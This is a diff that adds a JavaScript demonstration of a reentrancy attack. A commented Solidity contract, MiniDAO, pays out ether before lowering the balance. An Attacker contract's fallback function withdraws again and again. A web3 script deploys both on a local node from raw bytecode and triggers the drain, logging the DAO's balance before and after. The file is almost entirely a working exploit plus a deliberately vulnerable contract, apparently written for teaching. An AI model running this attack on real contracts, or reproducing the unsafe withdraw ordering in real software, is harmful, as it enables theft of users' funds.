@@ -1,0 +1,88 @@
+/*
+
+contract MiniDAO {
+    mapping (address => uint) balances;
+
+    function Deposit() {
+        balances[msg.sender] += msg.value;
+    }
+
+    function Withdraw(uint amount) {
+        if(balances[msg.sender] < amount) throw;
+        msg.sender.call.value(amount)();
+        balances[msg.sender] -= amount;
+    }
+}
+
+contract Attacker {
+
+    // limit the recursive calls to prevent out-of-gas error
+    uint stack = 0;
+    uint constant stackLimit = 10;
+    uint amount;
+    MiniDAO dao;
+
+    function Attacker(address daoAddress) {
+        dao = MiniDAO(daoAddress);
+        amount = msg.value;
+        dao.Deposit.value(msg.value)();
+    }
+
+    function Attack() {
+        dao.Withdraw(amount);
+    }
+
+    function() {
+        if(stack++ < 10) {
+            dao.Withdraw(amount);
+        }
+    }
+}
+
+*/
+
+var Web3 = require('web3');
+var web3 = new Web3(new Web3.providers.HttpProvider('http://localhost:8545'));
+
+var MiniDAO = {
+  abi: [{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"Withdraw","outputs":[],"type":"function"},{"constant":false,"inputs":[],"name":"Deposit","outputs":[],"type":"function"}],
+  data: '606060405261015a806100126000396000f360606040526000357c0100000000000000000000000000000000000000000000000000000000900480635b6b431d14610044578063ed21248c1461005c57610042565b005b61005a600480803590602001909190505061006b565b005b610069600480505061011b565b005b80600060005060003373ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000505410156100a757610002565b3373ffffffffffffffffffffffffffffffffffffffff168160405180905060006040518083038185876185025a03f1925050505080600060005060003373ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828282505403925050819055505b50565b34600060005060003373ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828282505401925050819055505b56'
+};
+
+var Attacker = {
+  abi: [{"constant":false,"inputs":[],"name":"Attack","outputs":[],"type":"function"},{"inputs":[{"name":"daoAddress","type":"address"}],"type":"constructor"}],
+  data: '60606040526000600060005055604051602080610285833981016040528080519060200190919050505b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff0219169083021790555034600160005081905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed21248c34604051827c010000000000000000000000000000000000000000000000000000000002815260040180905060006040518083038185886185025a03f115600257505050505b50610194806100f16000396000f36060604052361561003d576000357c010000000000000000000000000000000000000000000000000000000090048063f28adc4d146100f25761003d565b6100f05b600a6000600081815054809291906001019190505510156100ed57600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635b6b431d600160005054604051827c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000876161da5a03f115610002575050505b5b565b005b6100ff6004805050610101565b005b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635b6b431d600160005054604051827c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000876161da5a03f115610002575050505b56'
+}
+
+console.log('Creating MiniDAO with 90 ETH')
+var minidaoContract = web3.eth.contract(MiniDAO.abi);
+var minidao = minidaoContract.new(
+   {
+     from: web3.eth.accounts[0],
+     data: MiniDAO.data,
+     gas: 3000000,
+     value: web3.toWei(90)
+   }, function (e, dao){
+    if (typeof dao.address !== 'undefined') {
+
+      var daoAddress = dao.address;
+      var attackerContract = web3.eth.contract(Attacker.abi);
+
+      console.log('Investing 10 ETH')
+      var attacker = attackerContract.new(
+         daoAddress,
+         {
+           from: web3.eth.accounts[0],
+           data: Attacker.data,
+           gas: 3000000,
+           value: web3.toWei(10)
+         }, function (e, contract){
+          if (typeof contract.address !== 'undefined') {
+            console.log('MiniDAO balance: ' + web3.fromWei(web3.eth.getBalance(minidao.address)))
+            console.log('Attack!')
+            attacker.Attack({ from: web3.eth.accounts[0] })
+            console.log('MiniDAO balance: ' + web3.fromWei(web3.eth.getBalance(minidao.address)))
+          }
+       })
+    }
+ })
